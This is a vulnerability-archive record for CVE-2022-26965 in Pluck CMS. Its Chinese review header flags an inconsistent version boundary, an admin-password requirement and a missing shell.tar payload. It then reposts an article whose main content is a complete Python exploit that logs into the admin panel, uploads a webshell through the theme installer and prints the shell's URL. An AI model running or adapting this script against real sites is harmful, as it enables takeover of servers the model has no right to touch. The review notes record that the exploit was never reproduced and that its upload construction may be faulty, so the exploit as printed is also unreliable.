---
cve: "CVE-2022-26965"
product: "Pluck CMS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2022-26965"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "Pluck CMS 主题安装代码执行实验（需管理员；版本边界待核）"
version: "4.7.16 与 before 4.7.16 原文冲突，待核"
prerequisites: "来源所述条件，未列明部分仍待核：Admin password; theme installation; title 4.7.16 but code says before 4.7.16"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/F0JmusxHqdF88OkYvX-n4Q"
id: "vw-ad8ae0725029d982fa0c4579"
entity_id: "ve-ad8ae0725029d982fa0c4579"
schema_version: "1"
---

## 核对与使用边界

- 明确边界：所贴主题安装 EXP 明示需要管理员密码/权限，不是匿名 RCE 证据。标题 4.7.16 与注释 before 4.7.16 矛盾，准确上下界待公告；所需 shell.tar 未提供，原 multipart 声明与提交裸归档的构造也未证明正确。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Admin password; theme installation; title 4.7.16 but code says before 4.7.16

- **事实待核（1）**：Version boundary internally inconsistent (4.7.16 vs before 4.7.16)。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（2）**：Headline omits authenticated/admin requirement explicit in embedded exploit。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **适用与权限边界（3）**：shell.tar is required but not supplied or its multipart construction explained; raw archive submitted under multipart content type needs checking。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **来源与引用处置（4）**：Repeated Valentine's Day slogans and disclaimer dominate front matter。保留这部分来源材料并与技术结论分开；其引用或宣传内容不能补足本文漏洞的证据。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 【0day EXP】Pluck CMS 4.7.16 远程执行代码 （RCE）

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/F0JmusxHqdF88OkYvX-n4Q)

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责，EXP 与 POC 仅仅只供对已授权的目标使用测试，对未授权目标的测试本文库不承担责任，均由本人自行承担。本文库中的漏洞均为公开的漏洞收集！如果本文您认为不适宜被发布，请在后台联系我们删除，或发送到运营的电子邮箱：tang_wenshu@outlook.com。

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

  

漏洞说明
----

Pluck是一套使用PHP语言开发的内容管理系统（CMS）。Pluck CMS 4.7.16版本存在权限许可和访问控制问题漏洞，该漏洞源于Pluck CMS 4.7.16版本存在远程 shell 上传执行漏洞。

**威胁级别：**【严重】

**影响版本：**Pluck CMS 4.7.16

漏洞EXP
-----

```
# Exploit Title: Pluck CMS 4.7.16 - Remote Code Execution (RCE) (Authenticated)  
# Date: 13.03.2022  
# Exploit Author: Ashish Koli (Shikari)  
# Vendor Homepage: https://github.com/pluck-cms/pluck  
# Version: 4.7.16  
# Tested on Ubuntu 20.04.3 LTS  
# CVE: CVE-2022-26965  
# Usage : python3 exploit.py <IP> <Port> <Password> <Pluckcmspath>  
# Example:  python3 exploit.py 127.0.0.1 80 admin /pluck  
# Reference: https://github.com/shikari00007/Pluck-CMS-Pluck-4.7.16-Theme-Upload-Remote-Code-Execution-Authenticated--POC  
  
'''  
Description:  
A theme upload functinality in Pluck CMS before 4.7.16 allows an admin  
privileged user to gain access in the host through the "themes files",  
which may result in remote code execution.  
'''  
  
  
'''  
Import required modules:  
'''  
import sys  
import requests  
import json  
import time  
import urllib.parse  
import struct  
  
'''  
User Input:  
'''  
target_ip = sys.argv[1]  
target_port = sys.argv[2]  
password = sys.argv[3]  
pluckcmspath = sys.argv[4]  
  
  
'''  
Get cookie  
'''  
session = requests.Session()  
link = 'http://' + target_ip + ':' + target_port + pluckcmspath  
response = session.get(link)  
cookies_session = session.cookies.get_dict()  
cookie = json.dumps(cookies_session)  
cookie = cookie.replace('"}','')  
cookie = cookie.replace('{"', '')  
cookie = cookie.replace('"', '')  
cookie = cookie.replace(" ", '')  
cookie = cookie.replace(":", '=')  
  
  
'''  
Authentication:  
'''  
# Compute Content-Length:  
base_content_len = 27  
password_encoded = urllib.parse.quote(password, safe='')  
password_encoded_len = len(password_encoded.encode('utf-8'))  
content_len = base_content_len + password_encoded_len  
  
# Construct Header:  
header = {  
    'Host': target_ip,  
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',  
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',  
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',  
    'Accept-Encoding': 'gzip, deflate',  
    'Content-Type': 'application/x-www-form-urlencoded',  
    'Content-Length': str(content_len),  
    'Origin': 'http://' + target_ip,  
    'Connection': 'close',  
    'Referer': 'http://' + target_ip + pluckcmspath + '/login.php',  
    'Cookie': cookie,  
    'Upgrade-Insecure-Requests': '1'  
}  
  
# Construct Data:  
body = {  
    'cont1': password,  
    'bogus': '',  
    'submit': 'Log in',  
}  
  
# Authenticating:  
link_auth = 'http://' + target_ip + ':' + target_port + pluckcmspath + '/login.php'  
auth = requests.post(link_auth, headers=header, data=body)  
print('')  
if 'error' in auth.text:  
    print('Password incorrect, please try again:')  
    exit()  
else:  
    print('Authentification was succesfull, uploading webshell')  
    print('')  
  
  
'''  
Upload Webshell:  
'''  
# Construct Header:  
header1 = {  
    'Host': target_ip,  
    'Cache-Control': 'max-age=0',  
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90"',  
    'sec-ch-ua-mobile': '?0',  
    'Origin': 'http://' + target_ip,  
    'Upgrade-Insecure-Requests': '1',  
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryH7Ak5WhirAIQ8o1L',  
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',  
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',  
    'Sec-Fetch-Site': 'same-origin',  
    'Sec-Fetch-Mode': 'navigate',  
    'Sec-Fetch-User': '?1',  
    'Sec-Fetch-Dest': 'document',  
    'Referer': 'http://' + target_ip + ':' + target_port + pluckcmspath + '/admin.php?action=themeinstall',  
    'Accept-Encoding': 'gzip, deflate',  
    'Accept-Language': 'en-US,en;q=0.9',  
    'Cookie': cookie,  
    'Connection': 'close',  
      
}  
  
  
# loading Webshell payload:   
path = 'shell.tar'  
fp = open(path,'rb')  
data= fp.read()  
  
  
# Uploading Webshell:  
link_upload = 'http://' + target_ip + ':' + target_port + pluckcmspath + '/admin.php?action=themeinstall'  
upload = requests.post(link_upload, headers=header1, data=data)  
  
  
'''  
Finish:  
'''  
print('Uploaded Webshell to: http://' + target_ip + ':' + target_port + pluckcmspath + '/data/themes/shell/shell.php')  
print('') 
```

![图片](https://mmbiz.qpic.cn/mmbiz/yqP4lghX1JXRJibe2m9VF2NhPia9Myeoucwec9reDgGO2jtcUicOKInsHChZ8Duo44aTrcBtQvOd0orSCmbV7Dylg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz/yqP4lghX1JXRJibe2m9VF2NhPia9Myeouc5ccutRZtv69JpWSqDLa8j9nDclJ4LLXjAbZm4RZKrjp9UvHlriavtFw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
